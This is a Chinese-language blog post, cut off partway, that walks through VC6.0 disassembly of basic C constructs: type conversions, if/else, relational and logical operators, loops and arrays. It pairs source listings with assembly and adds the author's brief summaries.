        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>下文是简单的c语言转换汇编，然后加了一点自己的理解。<strong>有疑惑优先写代码，反汇编看完再说。</strong>只是简单的参考，以相应环境为准。这里我用的是vc6.0的版本。</p><br><h1 id="0x01类型转换"><a href="#0x01类型转换" class="headerlink" title="0x01类型转换"></a>0x01类型转换</h1><h2 id="只存在有符号"><a href="#只存在有符号" class="headerlink" title="只存在有符号"></a>只存在有符号</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1:        int a = 0xFFFFFFFF;</span><br><span class="line">0040D418   mov         dword ptr [ebp-4],0FFFFFFFFh</span><br><span class="line">2:        char b = 1;</span><br><span class="line">0040D41F   mov         byte ptr [ebp-8],1</span><br><span class="line">3:        int c = a;</span><br><span class="line">0040D423   mov         eax,dword ptr [ebp-4]</span><br><span class="line">0040D426   mov         dword ptr [ebp-0Ch],eax</span><br><span class="line">4:       char d = b;</span><br><span class="line">0040D429   mov         cl,byte ptr [ebp-8]</span><br><span class="line">0040D42C   mov         byte ptr [ebp-10h],cl</span><br><span class="line">5:       c = b;</span><br><span class="line">0040D42F   movsx       edx,byte ptr [ebp-8]</span><br><span class="line">0040D433   mov         dword ptr [ebp-0Ch],edx</span><br><span class="line">6:       d = a;</span><br><span class="line">0040D436   mov         al,byte ptr [ebp-4]</span><br><span class="line">0040D439   mov         byte ptr [ebp-10h],al</span><br><span class="line">7:       int e = a+b;</span><br><span class="line">0040D43C   movsx       ecx,byte ptr [ebp-8]</span><br><span class="line">0040D440   mov         edx,dword ptr [ebp-4]</span><br><span class="line">0040D443   add         edx,ecx</span><br><span class="line">0040D445   mov         dword ptr [ebp-14h],edx</span><br></pre></td></tr></table></figure><h2 id="只存在无符号（并不是使用movzx）"><a href="#只存在无符号（并不是使用movzx）" class="headerlink" title="只存在无符号（并不是使用movzx）"></a>只存在无符号（并不是使用movzx）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1:        unsigned int a = 0xFFFFFFFF;</span><br><span class="line">0040D418   mov         dword ptr [ebp-4],0FFFFFFFFh</span><br><span class="line">2:        unsigned char b = 1;</span><br><span class="line">0040D41F   mov         byte ptr [ebp-8],1</span><br><span class="line">3:        unsigned int c = a;</span><br><span class="line">0040D423   mov         eax,dword ptr [ebp-4]</span><br><span class="line">0040D426   mov         dword ptr [ebp-0Ch],eax</span><br><span class="line">4:       unsigned char d = b;</span><br><span class="line">0040D429   mov         cl,byte ptr [ebp-8]</span><br><span class="line">0040D42C   mov         byte ptr [ebp-10h],cl</span><br><span class="line">5:       c = b;</span><br><span class="line">0040D42F   mov         edx,dword ptr [ebp-8]</span><br><span class="line">0040D432   and         edx,0FFh</span><br><span class="line">0040D438   mov         dword ptr [ebp-0Ch],edx</span><br><span class="line">6:       d = a;</span><br><span class="line">0040D43B   mov         al,byte ptr [ebp-4]</span><br><span class="line">0040D43E   mov         byte ptr [ebp-10h],al</span><br><span class="line">7:       unsigned int e = a+b;</span><br><span class="line">0040D441   mov         ecx,dword ptr [ebp-8]</span><br><span class="line">0040D444   and         ecx,0FFh</span><br><span class="line">0040D44A   mov         edx,dword ptr [ebp-4]</span><br><span class="line">0040D44D   add         edx,ecx</span><br><span class="line">0040D44F   mov         dword ptr [ebp-14h],edx</span><br></pre></td></tr></table></figure><h2 id="有符号和无符号都出现的情况"><a href="#有符号和无符号都出现的情况" class="headerlink" title="有符号和无符号都出现的情况"></a>有符号和无符号都出现的情况</h2><p>第一种情况（两个无符号相加）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1:        unsigned int a = 0xFFFFFFFF;</span><br><span class="line">0040D418   mov         dword ptr [ebp-4],0FFFFFFFFh</span><br><span class="line">2:        unsigned char b = 1;</span><br><span class="line">0040D41F   mov         byte ptr [ebp-8],1</span><br><span class="line">3:        int c = a;</span><br><span class="line">0040D423   mov         eax,dword ptr [ebp-4]</span><br><span class="line">0040D426   mov         dword ptr [ebp-0Ch],eax</span><br><span class="line">4:       char d = b;</span><br><span class="line">0040D429   mov         cl,byte ptr [ebp-8]</span><br><span class="line">0040D42C   mov         byte ptr [ebp-10h],cl</span><br><span class="line">5:       c = b;</span><br><span class="line">0040D42F   mov         edx,dword ptr [ebp-8]</span><br><span class="line">0040D432   and         edx,0FFh</span><br><span class="line">0040D438   mov         dword ptr [ebp-0Ch],edx</span><br><span class="line">6:       d = a;</span><br><span class="line">0040D43B   mov         al,byte ptr [ebp-4]</span><br><span class="line">0040D43E   mov         byte ptr [ebp-10h],al</span><br><span class="line">7:       int e = a+b;</span><br><span class="line">0040D441   mov         ecx,dword ptr [ebp-8]</span><br><span class="line">0040D444   and         ecx,0FFh</span><br><span class="line">0040D44A   mov         edx,dword ptr [ebp-4]</span><br><span class="line">0040D44D   add         edx,ecx</span><br><span class="line">0040D44F   mov         dword ptr [ebp-14h],edx</span><br></pre></td></tr></table></figure><p>第二种情况（两个有符号数相加）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1:        int a = 0xFFFFFFFF;</span><br><span class="line">0040D418   mov         dword ptr [ebp-4],0FFFFFFFFh</span><br><span class="line">2:        char b = 1;</span><br><span class="line">0040D41F   mov         byte ptr [ebp-8],1</span><br><span class="line">3:        unsigned int c = a;</span><br><span class="line">0040D423   mov         eax,dword ptr [ebp-4]</span><br><span class="line">0040D426   mov         dword ptr [ebp-0Ch],eax</span><br><span class="line">4:       unsigned char d = b;</span><br><span class="line">0040D429   mov         cl,byte ptr [ebp-8]</span><br><span class="line">0040D42C   mov         byte ptr [ebp-10h],cl</span><br><span class="line">5:       c = b;</span><br><span class="line">0040D42F   movsx       edx,byte ptr [ebp-8]</span><br><span class="line">0040D433   mov         dword ptr [ebp-0Ch],edx</span><br><span class="line">6:       d = a;</span><br><span class="line">0040D436   mov         al,byte ptr [ebp-4]</span><br><span class="line">0040D439   mov         byte ptr [ebp-10h],al</span><br><span class="line">7:       unsigned int e = a+b;</span><br><span class="line">0040D43C   movsx       ecx,byte ptr [ebp-8]</span><br><span class="line">0040D440   mov         edx,dword ptr [ebp-4]</span><br><span class="line">0040D443   add         edx,ecx</span><br><span class="line">0040D445   mov         dword ptr [ebp-14h],edx</span><br></pre></td></tr></table></figure><p>第三种情况（无符号加有符号）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1:        unsigned a = 0xFFFFFFFF;</span><br><span class="line">0040D418   mov         dword ptr [ebp-4],0FFFFFFFFh</span><br><span class="line">2:        char b = 0x1;</span><br><span class="line">0040D41F   mov         byte ptr [ebp-8],1</span><br><span class="line">3:        int c = a+b;</span><br><span class="line">0040D423   movsx       eax,byte ptr [ebp-8]</span><br><span class="line">0040D427   mov         ecx,dword ptr [ebp-4]</span><br><span class="line">0040D42A   add         ecx,eax</span><br><span class="line">0040D42C   mov         dword ptr [ebp-0Ch],ecx</span><br></pre></td></tr></table></figure><p>第四种情况（有符号加无符号）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1:        int a = 0xFFFFFFFF;</span><br><span class="line">0040D418   mov         dword ptr [ebp-4],0FFFFFFFFh</span><br><span class="line">2:        unsigned char b = 0x1;</span><br><span class="line">0040D41F   mov         byte ptr [ebp-8],1</span><br><span class="line">3:        int c = a+b;</span><br><span class="line">0040D423   mov         eax,dword ptr [ebp-8]</span><br><span class="line">0040D426   and         eax,0FFh</span><br><span class="line">0040D42B   mov         ecx,dword ptr [ebp-4]</span><br><span class="line">0040D42E   add         ecx,eax</span><br><span class="line">0040D430   mov         dword ptr [ebp-0Ch],ecx</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li><strong>！！！计算机中无符号数和有符号数其实是一样的东西，主要看你把它当作什么，你想怎么输出！！！</strong></li><li>同样的宽度不会发生类型转换（不管是有符号还是无符号）；</li><li>高宽度数据类型赋值给低宽度数据类型，会直接截取低位赋值，不会发生类型转换；</li><li>低宽度类型赋值给高宽度类型，会发生类型转换（把低宽度类型转换为高宽度类型，这里有两种方法，一种是movsx，一种是用and。视频中提到的movzx并没有见到）。这时候会看低宽度类型的符号位，如果都是无符号，就使用and；如果都是有符号，就是用movsx。</li></ol><p>理解了第一句话基本上对这个就没有疑惑了，多看看代码就懂了，再不懂就写写然后反汇编看看。</p><br><h1 id="0x02-if-else"><a href="#0x02-if-else" class="headerlink" title="0x02 if else"></a>0x02 if else</h1><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">int</span> x=<span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(x==<span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;3&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;4&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">1:        if(1)&#123;</span><br><span class="line">00410658   mov         eax,1</span><br><span class="line">0041065D   test        eax,eax</span><br><span class="line">0041065F   je          main+2Eh (0041066e)</span><br><span class="line">2:            printf(&quot;1&quot;);</span><br><span class="line">00410661   push        offset string &quot;1&quot; (00426eec)</span><br><span class="line">00410666   call        printf (00410940)</span><br><span class="line">0041066B   add         esp,4</span><br><span class="line">3:        &#125;</span><br><span class="line">4:       if(0)&#123;</span><br><span class="line">0041066E   xor         ecx,ecx</span><br><span class="line">00410670   test        ecx,ecx</span><br><span class="line">00410672   je          main+43h (00410683)</span><br><span class="line">5:           printf(&quot;0&quot;);</span><br><span class="line">00410674   push        offset string &quot;0&quot; (00426ee8)</span><br><span class="line">00410679   call        printf (00410940)</span><br><span class="line">0041067E   add         esp,4</span><br><span class="line">6:       &#125;else if(int x=2)&#123;</span><br><span class="line">00410681   jmp         main+81h (004106c1)</span><br><span class="line">00410683   mov         dword ptr [x],2</span><br><span class="line">0041068A   cmp         dword ptr [x],0</span><br><span class="line">0041068E   je          main+5Fh (0041069f)</span><br><span class="line">7:           printf(&quot;2&quot;);</span><br><span class="line">00410690   push        offset string &quot;2&quot; (00426d44)</span><br><span class="line">00410695   call        printf (00410940)</span><br><span class="line">0041069A   add         esp,4</span><br><span class="line">8:       &#125;else if(x==2)&#123;</span><br><span class="line">0041069D   jmp         main+81h (004106c1)</span><br><span class="line">0041069F   cmp         dword ptr [x],2</span><br><span class="line">004106A3   jne         main+74h (004106b4)</span><br><span class="line">9:           printf(&quot;3&quot;);</span><br><span class="line">004106A5   push        offset string &quot;3&quot; (0042602c)</span><br><span class="line">004106AA   call        printf (00410940)</span><br><span class="line">004106AF   add         esp,4</span><br><span class="line">10:       &#125;else&#123;</span><br><span class="line">004106B2   jmp         main+81h (004106c1)</span><br><span class="line">11:           printf(&quot;4&quot;);</span><br><span class="line">004106B4   push        offset string &quot;4&quot; (0042601c)</span><br><span class="line">004106B9   call        printf (00410940)</span><br><span class="line">004106BE   add         esp,4</span><br></pre></td></tr></table></figure><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><ol><li>每个条件跳转指令要跳转的地址前面都有jmp指令（第一个条件跳转指令除外），如果没有jmp说明不是if else，是单纯的if。</li><li>这些jmp跳转的地址是一样的，都跳转到end</li><li>如果某个分支没有条件判断，则为else部分。</li></ol><br><h1 id="0x03-关系运算符"><a href="#0x03-关系运算符" class="headerlink" title="0x03 关系运算符"></a>0x03 关系运算符</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">1:        int a = 1;</span><br><span class="line">00401028   mov         dword ptr [ebp-4],1</span><br><span class="line">2:        int b = 2;</span><br><span class="line">0040102F   mov         dword ptr [ebp-8],2</span><br><span class="line">3:        int c;</span><br><span class="line">4:       c=a==b;</span><br><span class="line">00401036   mov         eax,dword ptr [ebp-4]</span><br><span class="line">00401039   xor         ecx,ecx</span><br><span class="line">0040103B   cmp         eax,dword ptr [ebp-8]</span><br><span class="line">0040103E   sete        cl</span><br><span class="line">00401041   mov         dword ptr [ebp-0Ch],ecx</span><br><span class="line">5:       c=a!=b;</span><br><span class="line">00401044   mov         edx,dword ptr [ebp-4]</span><br><span class="line">00401047   xor         eax,eax</span><br><span class="line">00401049   cmp         edx,dword ptr [ebp-8]</span><br><span class="line">0040104C   setne       al</span><br><span class="line">0040104F   mov         dword ptr [ebp-0Ch],eax</span><br><span class="line">6:       c=a&gt;=b;</span><br><span class="line">00401052   mov         ecx,dword ptr [ebp-4]</span><br><span class="line">00401055   xor         edx,edx</span><br><span class="line">00401057   cmp         ecx,dword ptr [ebp-8]</span><br><span class="line">0040105A   setge       dl</span><br><span class="line">0040105D   mov         dword ptr [ebp-0Ch],edx</span><br><span class="line">7:       c=a&lt;=b;</span><br><span class="line">00401060   mov         eax,dword ptr [ebp-4]</span><br><span class="line">00401063   xor         ecx,ecx</span><br><span class="line">00401065   cmp         eax,dword ptr [ebp-8]</span><br><span class="line">00401068   setle       cl</span><br><span class="line">0040106B   mov         dword ptr [ebp-0Ch],ecx</span><br><span class="line">8:       c=a&gt;b;</span><br><span class="line">0040106E   mov         edx,dword ptr [ebp-4]</span><br><span class="line">00401071   xor         eax,eax</span><br><span class="line">00401073   cmp         edx,dword ptr [ebp-8]</span><br><span class="line">00401076   setg        al</span><br><span class="line">00401079   mov         dword ptr [ebp-0Ch],eax</span><br><span class="line">9:       c=a&lt;b;</span><br><span class="line">0040107C   mov         ecx,dword ptr [ebp-4]</span><br><span class="line">0040107F   xor         edx,edx</span><br><span class="line">00401081   cmp         ecx,dword ptr [ebp-8]</span><br><span class="line">00401084   setl        dl</span><br><span class="line">00401087   mov         dword ptr [ebp-0Ch],edx</span><br></pre></td></tr></table></figure><br><h1 id="0x04-逻辑运算符"><a href="#0x04-逻辑运算符" class="headerlink" title="0x04 逻辑运算符"></a>0x04 逻辑运算符</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">1:        int a = 1;</span><br><span class="line">00401028   mov         dword ptr [ebp-4],1</span><br><span class="line">2:        int b = 2;</span><br><span class="line">0040102F   mov         dword ptr [ebp-8],2</span><br><span class="line">3:        int c = 0;</span><br><span class="line">00401036   mov         dword ptr [ebp-0Ch],0</span><br><span class="line">4:       int d;</span><br><span class="line">5:       d=(a &amp;&amp; b || c);</span><br><span class="line">0040103D   cmp         dword ptr [ebp-4],0</span><br><span class="line">00401041   je          main+39h (00401049)</span><br><span class="line">00401043   cmp         dword ptr [ebp-8],0</span><br><span class="line">00401047   jne         main+48h (00401058)</span><br><span class="line">00401049   cmp         dword ptr [ebp-0Ch],0</span><br><span class="line">0040104D   jne         main+48h (00401058)</span><br><span class="line">0040104F   mov         dword ptr [ebp-14h],0</span><br><span class="line">00401056   jmp         main+4Fh (0040105f)</span><br><span class="line">00401058   mov         dword ptr [ebp-14h],1</span><br><span class="line">0040105F   mov         eax,dword ptr [ebp-14h]</span><br><span class="line">00401062   mov         dword ptr [ebp-10h],eax</span><br><span class="line">6:       d = !d;</span><br><span class="line">00401065   xor         ecx,ecx</span><br><span class="line">00401067   cmp         dword ptr [ebp-10h],0</span><br><span class="line">0040106B   sete        cl</span><br><span class="line">0040106E   mov         dword ptr [ebp-10h],ecx</span><br></pre></td></tr></table></figure><br><h1 id="0x05循环"><a href="#0x05循环" class="headerlink" title="0x05循环"></a>0x05循环</h1><h2 id="do-while循环"><a href="#do-while循环" class="headerlink" title="do while循环"></a>do while循环</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1:        int i = 1;</span><br><span class="line">00401028   mov         dword ptr [ebp-4],1</span><br><span class="line">2:        do&#123;</span><br><span class="line">3:            printf(&quot;%d&quot;,i);</span><br><span class="line">0040102F   mov         eax,dword ptr [ebp-4]</span><br><span class="line">00401032   push        eax</span><br><span class="line">00401033   push        offset string &quot;%d&quot; (0042201c)</span><br><span class="line">00401038   call        printf (0040d690)</span><br><span class="line">0040103D   add         esp,8</span><br><span class="line">4:           i++;</span><br><span class="line">00401040   mov         ecx,dword ptr [ebp-4]</span><br><span class="line">00401043   add         ecx,1</span><br><span class="line">00401046   mov         dword ptr [ebp-4],ecx</span><br><span class="line">5:       &#125;while(i&lt;10);</span><br><span class="line">00401049   cmp         dword ptr [ebp-4],0Ah</span><br><span class="line">0040104D   jl          main+1Fh (0040102f)</span><br></pre></td></tr></table></figure><h2 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1:        int i = 1;</span><br><span class="line">00401028   mov         dword ptr [ebp-4],1</span><br><span class="line">2:        while(i&lt;10)&#123;</span><br><span class="line">0040102F   cmp         dword ptr [ebp-4],0Ah</span><br><span class="line">00401033   jge         main+41h (00401051)</span><br><span class="line">3:            printf(&quot;%d&quot;,i);</span><br><span class="line">00401035   mov         eax,dword ptr [ebp-4]</span><br><span class="line">00401038   push        eax</span><br><span class="line">00401039   push        offset string &quot;%d&quot; (0042201c)</span><br><span class="line">0040103E   call        printf (0040d690)</span><br><span class="line">00401043   add         esp,8</span><br><span class="line">4:           i++;</span><br><span class="line">00401046   mov         ecx,dword ptr [ebp-4]</span><br><span class="line">00401049   add         ecx,1</span><br><span class="line">0040104C   mov         dword ptr [ebp-4],ecx</span><br><span class="line">5:       &#125;</span><br><span class="line">0040104F   jmp         main+1Fh (0040102f)</span><br></pre></td></tr></table></figure><h2 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1:        for(int i=1; i&lt;10; i++)&#123;</span><br><span class="line">00401028   mov         dword ptr [ebp-4],1</span><br><span class="line">0040102F   jmp         main+2Ah (0040103a)</span><br><span class="line">00401031   mov         eax,dword ptr [ebp-4]</span><br><span class="line">00401034   add         eax,1</span><br><span class="line">00401037   mov         dword ptr [ebp-4],eax</span><br><span class="line">0040103A   cmp         dword ptr [ebp-4],0Ah</span><br><span class="line">0040103E   jge         main+43h (00401053)</span><br><span class="line">2:            printf(&quot;%d&quot;,i);</span><br><span class="line">00401040   mov         ecx,dword ptr [ebp-4]</span><br><span class="line">00401043   push        ecx</span><br><span class="line">00401044   push        offset string &quot;%d&quot; (0042201c)</span><br><span class="line">00401049   call        printf (0040d690)</span><br><span class="line">0040104E   add         esp,8</span><br><span class="line">3:        &#125;</span><br><span class="line">00401051   jmp         main+21h (00401031)</span><br></pre></td></tr></table></figure><br><h1 id="0x06-数组"><a href="#0x06-数组" class="headerlink" title="0x06 数组"></a>0x06 数组</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">0040D490   push        ebp</span><br><span class="line">0040D491   mov         ebp,esp</span><br><span class="line">0040D493   sub         esp,60h</span><br><span class="line">0040D496   push        ebx</span><br><span class="line">0040D497   push        esi</span><br><span class="line">0040D498   push        edi</span><br><span class="line">0040D499   lea         edi,[ebp-60h]</span><br><span class="line">0040D49C   mov         ecx,18h</span><br><span class="line">0040D4A1   mov         eax,0CCCCCCCCh</span><br><span class="line">0040D4A6   rep stos    dword ptr [edi]</span><br><span class="line">1:        int a[7] = &#123;0,1,2,3,4,5,6&#125;;</span><br><span class="line">00401028   mov         dword ptr [ebp-1Ch],0</span><br><span class="line">0040102F   mov         dword ptr [ebp-18h],1</span><br><span class="line">00401036   mov         dword ptr [ebp-14h],2</span><br><span class="line">0040103D   mov         dword ptr [ebp-10h],3</span><br><span class="line">00401044   mov         dword ptr [ebp-0Ch],4</span><br><span class="line">0040104B   mov         dword ptr [ebp-8],5</span><br><span class="line">00401052   mov         dword ptr [ebp-4],6</span><br><span class="line">2:        int b = a[0];</span><br><span class="line">00401059   mov         eax,dword ptr [ebp-1Ch]</span><br><span class="line">0040105C   mov         dword ptr [ebp-20h],eax</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">0040D490   push        ebp</span><br><span class="line">0040D491   mov         ebp,esp</span><br><span class="line">0040D493   sub         esp,4Ch</span><br><span class="line">0040D496   push        ebx</span><br><span class="line">0040D497   push        esi</span><br><span class="line">0040D498   push        edi</span><br><span class="line">0040D499   lea         edi,[ebp-4Ch]</span><br><span class="line">0040D49C   mov         ecx,13h</span><br><span class="line">0040D4A1   mov         eax,0CCCCCCCCh</span><br><span class="line">0040D4A6   rep stos    dword ptr [edi]</span><br><span class="line">1:       char a[7]=&#123;0,1,2,3,4,5,6&#125;;</span><br><span class="line">00401078   mov         byte ptr [ebp-8],0</span><br><span class="line">0040107C   mov         byte ptr [ebp-7],1</span><br><span class="line">00401080   mov         byte ptr [ebp-6],2</span><br><span class="line">00401084   mov         byte ptr [ebp-5],3</span><br><span class="line">00401088   mov         byte ptr [ebp-4],4</span><br><span class="line">0040108C   mov         byte ptr [ebp-3],5</span><br><span class="line">00401090   mov         byte ptr [ebp-2],6</span><br><span class="line">2:       char b = a[0];</span><br><span class="line">00401094   mov         al,byte ptr [ebp-8]</span><br><span class="line">00401097   mov         byte ptr [ebp-0Ch],al</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 